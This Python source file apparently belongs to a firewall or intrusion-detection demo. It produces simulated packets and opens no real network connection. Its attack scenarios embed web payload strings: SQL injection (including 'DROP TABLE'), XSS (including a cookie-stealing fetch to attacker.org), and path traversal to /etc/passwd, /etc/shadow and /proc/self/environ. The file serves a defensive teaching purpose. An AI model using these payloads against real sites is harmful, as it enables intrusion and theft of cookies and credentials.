"""
traffic_simulator.py
Generates fake packets on a background thread.

NOTHING HERE TOUCHES A REAL NETWORK.
No sockets are opened, no interface is read, no host is contacted.
Every "packet" is just a Packet object created by random.choice().

The simulator runs a loop on its own thread:
  * normal traffic is produced continuously while running
  * attack scenarios are queued as "jobs" and played out packet by packet
"""

import queue
import random
import threading
import time

import config
from models.packet import Packet

# Pools used to build believable-looking fake traffic
NORMAL_SOURCES = ["192.168.1.10", "192.168.1.25", "192.168.1.40",
                  "10.0.0.5", "10.0.0.9", "172.16.0.12"]
EXTERNAL_SOURCES = ["203.0.113.7", "198.51.100.23", "45.77.12.90",
                    "185.220.101.5", "91.200.12.44"]
SERVERS = ["192.168.1.100", "192.168.1.101", "10.0.0.1"]
COMMON_PORTS = [80, 443, 53, 8080, 25, 110, 143, 3306, 22, 3389]
# Web and DNS dominate real traffic, so we pick those far more often.
# This also keeps the ALLOW / BLOCK mix on the dashboard realistic.
PORT_WEIGHTS = [35, 30, 18, 4, 3, 2, 2, 2, 2, 2]

# Ports a scanner typically sweeps through
SCAN_PORTS = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445,
              993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 8080, 8443]


class TrafficSimulator:
    """Produces simulated packets and hands them to a callback."""

    def __init__(self, on_packet):
        """
        on_packet: callable(Packet) -> None
                   Called on the simulator thread for every packet produced.
        """
        self.on_packet = on_packet
        self._thread = None
        self._running = threading.Event()
        self._jobs = queue.Queue()        # queued attack scenarios
        self.speed = 20                   # normal packets per second
        self.normal_enabled = True
        self._normal_sessions = []

    # ------------------------------------------------------------------ control
    @property
    def is_running(self) -> bool:
        return self._running.is_set()

    def start(self, speed=None):
        if self.is_running:
            return
        if speed:
            self.speed = max(1, int(speed))
        self._running.set()
        self._thread = threading.Thread(target=self._loop, daemon=True,
                                        name="TrafficSimulator")
        self._thread.start()

    def stop(self):
        self._running.clear()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=2)
        self._thread = None
        self._normal_sessions.clear()

    def set_speed(self, pps):
        self.speed = max(1, int(pps))

    # ------------------------------------------------------------------ jobs
    def launch_port_scan(self, src_ip=None, port_count=25, delay=0.03):
        self._jobs.put(("PORT_SCAN", {
            "src_ip": src_ip or random.choice(EXTERNAL_SOURCES),
            "port_count": int(port_count),
            "delay": delay,
        }))

    def launch_brute_force(self, src_ip=None, attempts=12, port=22, delay=0.12):
        self._jobs.put(("BRUTE_FORCE", {
            "src_ip": src_ip or random.choice(EXTERNAL_SOURCES),
            "attempts": int(attempts),
            "port": int(port),
            "delay": delay,
        }))

    def launch_flood(self, src_ip=None, packet_count=150, delay=0.004):
        self._jobs.put(("TRAFFIC_FLOOD", {
            "src_ip": src_ip or random.choice(EXTERNAL_SOURCES),
            "packet_count": int(packet_count),
            "delay": delay,
        }))

    def launch_stealth_scan(self, src_ip=None, scan_type="FIN", port_count=20, delay=0.03):
        self._jobs.put(("STEALTH_SCAN", {
            "src_ip": src_ip or random.choice(EXTERNAL_SOURCES),
            "scan_type": scan_type,
            "port_count": int(port_count),
            "delay": delay,
        }))

    def launch_sqli_attack(self, src_ip=None):
        self._jobs.put(("SQLI", {
            "src_ip": src_ip or random.choice(EXTERNAL_SOURCES),
        }))

    def launch_xss_attack(self, src_ip=None):
        self._jobs.put(("XSS", {
            "src_ip": src_ip or random.choice(EXTERNAL_SOURCES),
        }))

    def launch_path_traversal_attack(self, src_ip=None):
        self._jobs.put(("TRAVERSAL", {
            "src_ip": src_ip or random.choice(EXTERNAL_SOURCES),
        }))

    # ------------------------------------------------------------------ main loop
    def _loop(self):
        while self._running.is_set():
            # 1. Any attack scenario waiting? Play it out first.
            try:
                job, params = self._jobs.get_nowait()
            except queue.Empty:
                job = None

            if job == "PORT_SCAN":
                self._run_port_scan(**params)
            elif job == "BRUTE_FORCE":
                self._run_brute_force(**params)
            elif job == "TRAFFIC_FLOOD":
                self._run_flood(**params)
            elif job == "STEALTH_SCAN":
                self._run_stealth_scan(**params)
            elif job == "SQLI":
                self._run_sqli(**params)
            elif job == "XSS":
                self._run_xss(**params)
            elif job == "TRAVERSAL":
                self._run_path_traversal(**params)

            # 2. Normal background traffic
            if self.normal_enabled:
                pkt, sess = self._make_normal_packet()
                self._emit(pkt, sess)
                time.sleep(1.0 / self.speed)
            else:
                time.sleep(0.05)

    def _emit(self, packet, sess=None):
        try:
            self.on_packet(packet)
            # If the firewall blocked this connection attempt, remove the session
            # so the client doesn't send orphan ACK/data packets
            if sess is not None and packet.action == "BLOCK":
                if sess in self._normal_sessions:
                    self._normal_sessions.remove(sess)
        except Exception as exc:                      # never kill the thread
            print(f"[simulator] packet handler error: {exc}")

    # ------------------------------------------------------------------ generators
    def _make_normal_packet(self) -> tuple:
        """Stateful ordinary traffic: 3-way handshakes, data streams, occasional UDP/auth."""
        # 15% UDP traffic (DNS)
        if random.random() < 0.15:
            src = random.choice(NORMAL_SOURCES)
            dst = random.choice(SERVERS)
            dns_query = f"Standard query 0x{random.randint(1000, 9999):x} A google.com"
            return Packet(src_ip=src, dst_ip=dst,
                          src_port=random.randint(1024, 65535), dst_port=53,
                          protocol="UDP", flags="", kind=config.KIND_NORMAL,
                          payload=dns_query,
                          size=random.randint(64, 512)), None

        # TCP traffic with handshake progression
        if self._normal_sessions and random.random() > 0.30:
            sess = random.choice(self._normal_sessions)
            if sess["stage"] == "SYN":
                sess["stage"] = "ESTABLISHED"
                # Client completes handshake
                return Packet(src_ip=sess["src"], dst_ip=sess["dst"],
                              src_port=sess["sport"], dst_port=sess["dport"],
                              protocol="TCP", flags="ACK", kind=config.KIND_NORMAL,
                              size=64), sess
            elif sess["stage"] == "ESTABLISHED":
                sess["remaining"] -= 1
                if sess["remaining"] <= 0:
                    if sess in self._normal_sessions:
                        self._normal_sessions.remove(sess)
                    return Packet(src_ip=sess["src"], dst_ip=sess["dst"],
                                  src_port=sess["sport"], dst_port=sess["dport"],
                                  protocol="TCP", flags="FIN,ACK", kind=config.KIND_NORMAL,
                                  size=64), sess
                else:
                    kind = config.KIND_AUTH if sess["is_auth"] else config.KIND_NORMAL
                    if sess["dport"] == 80:
                        payload = random.choice([
                            "GET /index.html HTTP/1.1\r\nHost: example.com",
                            "GET /api/status HTTP/1.1\r\nHost: api.local",
                            "POST /api/feedback HTTP/1.1\r\nHost: app.local\r\n\r\nmessage=System+normal",
                            "GET /images/logo.png HTTP/1.1\r\nHost: cdn.local",
                        ])
                    elif sess["dport"] == 443:
                        payload = "TLS 1.3 Application Data [Encrypted]"
                    elif sess["dport"] == 22:
                        payload = "SSH-2.0-OpenSSH_8.9p1"
                    else:
                        payload = ""

                    return Packet(src_ip=sess["src"], dst_ip=sess["dst"],
                                  src_port=sess["sport"], dst_port=sess["dport"],
                                  protocol="TCP", flags="PSH,ACK", kind=kind,
                                  payload=payload,
                                  auth_success=True, size=random.randint(128, 1460)), sess

        # Start a new TCP connection (SYN packet)
        src = random.choice(NORMAL_SOURCES + EXTERNAL_SOURCES[:2])
        dst = random.choice(SERVERS)
        dst_port = random.choices(COMMON_PORTS, weights=PORT_WEIGHTS, k=1)[0]
        if dst_port == 53:
            dst_port = 80
        sport = random.randint(1024, 65535)
        is_auth = (dst_port == 22)

        sess = {
            "src": src,
            "dst": dst,
            "sport": sport,
            "dport": dst_port,
            "stage": "SYN",
            "remaining": random.randint(2, 6),
            "is_auth": is_auth,
        }
        if len(self._normal_sessions) < 50:
            self._normal_sessions.append(sess)

        kind = config.KIND_AUTH if is_auth else config.KIND_NORMAL
        pkt = Packet(src_ip=src, dst_ip=dst, src_port=sport, dst_port=dst_port,
                     protocol="TCP", flags="SYN", kind=kind,
                     size=64)
        return pkt, sess

    def _run_port_scan(self, src_ip, port_count, delay):
        """Standard TCP SYN port scan."""
        dst = random.choice(SERVERS)
        ports = random.sample(SCAN_PORTS, min(port_count, len(SCAN_PORTS)))
        while len(ports) < port_count:
            extra = random.randint(1, 10000)
            if extra not in ports:
                ports.append(extra)

        for port in ports:
            if not self._running.is_set():
                return
            self._emit(Packet(src_ip=src_ip, dst_ip=dst,
                              src_port=random.randint(1024, 65535), dst_port=port,
                              protocol="TCP", flags="SYN", kind=config.KIND_SCAN, size=64))
            time.sleep(delay)

    def _run_brute_force(self, src_ip, attempts, port, delay):
        """Repeated failed logins against one service port."""
        dst = random.choice(SERVERS)
        sport = random.randint(1024, 65535)
        # Initiating SYN
        self._emit(Packet(src_ip=src_ip, dst_ip=dst,
                          src_port=sport, dst_port=port,
                          protocol="TCP", flags="SYN", kind=config.KIND_AUTH,
                          auth_success=False, size=64))
        time.sleep(delay)

        for i in range(attempts):
            if not self._running.is_set():
                return
            success = (i == attempts - 1) and random.random() < 0.2
            self._emit(Packet(src_ip=src_ip, dst_ip=dst,
                              src_port=sport, dst_port=port,
                              protocol="TCP", flags="PSH,ACK", kind=config.KIND_AUTH,
                              auth_success=success, size=128))
            time.sleep(delay)

    def _run_flood(self, src_ip, packet_count, delay):
        """A very high packet rate from a single IP (SYN Flood)."""
        dst = random.choice(SERVERS)
        dst_port = random.choice([80, 443])
        for _ in range(packet_count):
            if not self._running.is_set():
                return
            self._emit(Packet(src_ip=src_ip, dst_ip=dst,
                              src_port=random.randint(1024, 65535),
                              dst_port=dst_port, protocol="TCP", flags="SYN",
                              kind=config.KIND_FLOOD, size=64))
            time.sleep(delay)

    def _run_stealth_scan(self, src_ip, scan_type, port_count, delay):
        """Evasion scan: FIN, Xmas, or NULL scan to bypass stateless filters."""
        dst = random.choice(SERVERS)
        ports = random.sample(SCAN_PORTS, min(port_count, len(SCAN_PORTS)))
        flags_map = {
            "FIN": "FIN",
            "XMAS": "FIN,PSH,URG",
            "NULL": "",
            "SYN_FIN": "SYN,FIN"
        }
        flags = flags_map.get(scan_type.upper(), "FIN")
        for port in ports:
            if not self._running.is_set():
                return
            self._emit(Packet(src_ip=src_ip, dst_ip=dst,
                              src_port=random.randint(1024, 65535), dst_port=port,
                              protocol="TCP", flags=flags,
                              kind=config.KIND_STEALTH, size=64))
            time.sleep(delay)

    def _run_sqli(self, src_ip, delay=0.08):
        """Generates realistic HTTP packets weaponized with SQL Injection payloads."""
        dst = random.choice(SERVERS)
        sport = random.randint(1024, 65535)
        payloads = [
            "GET /search?query=admin' OR 1=1 -- HTTP/1.1\r\nHost: portal.local",
            "POST /api/login HTTP/1.1\r\nHost: portal.local\r\n\r\nuser=admin' UNION SELECT id,password,email FROM users --",
            "GET /items?cat=1; DROP TABLE logs; -- HTTP/1.1\r\nHost: portal.local",
            "GET /account?user=' OR 'x'='x' HTTP/1.1\r\nHost: portal.local",
        ]
        # Handshake
        self._emit(Packet(src_ip=src_ip, dst_ip=dst, src_port=sport, dst_port=80, protocol="TCP", flags="SYN", size=64))
        time.sleep(delay)
        self._emit(Packet(src_ip=src_ip, dst_ip=dst, src_port=sport, dst_port=80, protocol="TCP", flags="ACK", size=64))
        time.sleep(delay)
        for p in payloads:
            if not self._running.is_set():
                return
            self._emit(Packet(src_ip=src_ip, dst_ip=dst, src_port=sport, dst_port=80, protocol="TCP",
                              flags="PSH,ACK", kind=config.KIND_SQLI, payload=p, size=len(p)))
            time.sleep(delay)

    def _run_xss(self, src_ip, delay=0.08):
        """Generates realistic HTTP packets weaponized with Cross-Site Scripting (XSS) payloads."""
        dst = random.choice(SERVERS)
        sport = random.randint(1024, 65535)
        payloads = [
            "POST /comments HTTP/1.1\r\nHost: blog.local\r\n\r\ncomment=<script>alert('XSS Exploit!')</script>",
            "GET /profile?name=<img src=x onerror=alert(document.cookie)> HTTP/1.1\r\nHost: portal.local",
            "GET /welcome?user=<svg/onload=fetch('//attacker.org/'+document.cookie)> HTTP/1.1\r\nHost: portal.local",
            "GET /redirect?url=javascript:alert('pwned') HTTP/1.1\r\nHost: portal.local",
        ]
        # Handshake
        self._emit(Packet(src_ip=src_ip, dst_ip=dst, src_port=sport, dst_port=80, protocol="TCP", flags="SYN", size=64))
        time.sleep(delay)
        self._emit(Packet(src_ip=src_ip, dst_ip=dst, src_port=sport, dst_port=80, protocol="TCP", flags="ACK", size=64))
        time.sleep(delay)
        for p in payloads:
            if not self._running.is_set():
                return
            self._emit(Packet(src_ip=src_ip, dst_ip=dst, src_port=sport, dst_port=80, protocol="TCP",
                              flags="PSH,ACK", kind=config.KIND_XSS, payload=p, size=len(p)))
            time.sleep(delay)

    def _run_path_traversal(self, src_ip, delay=0.08):
        """Generates realistic HTTP packets attempting Directory/Path Traversal (LFI)."""
        dst = random.choice(SERVERS)
        sport = random.randint(1024, 65535)
        payloads = [
            "GET /download?file=../../../../etc/passwd HTTP/1.1\r\nHost: file.local",
            "GET /view?doc=..\\..\\windows\\system32\\drivers\\etc\\hosts HTTP/1.1\r\nHost: files.local",
            "GET /read?path=../../../../proc/self/environ HTTP/1.1\r\nHost: api.local",
            "GET /image?file=../../../../etc/shadow HTTP/1.1\r\nHost: file.local",
        ]
        # Handshake
        self._emit(Packet(src_ip=src_ip, dst_ip=dst, src_port=sport, dst_port=80, protocol="TCP", flags="SYN", size=64))
        time.sleep(delay)
        self._emit(Packet(src_ip=src_ip, dst_ip=dst, src_port=sport, dst_port=80, protocol="TCP", flags="ACK", size=64))
        time.sleep(delay)
        for p in payloads:
            if not self._running.is_set():
                return
            self._emit(Packet(src_ip=src_ip, dst_ip=dst, src_port=sport, dst_port=80, protocol="TCP",
                              flags="PSH,ACK", kind=config.KIND_TRAVERSAL, payload=p, size=len(p)))
            time.sleep(delay)
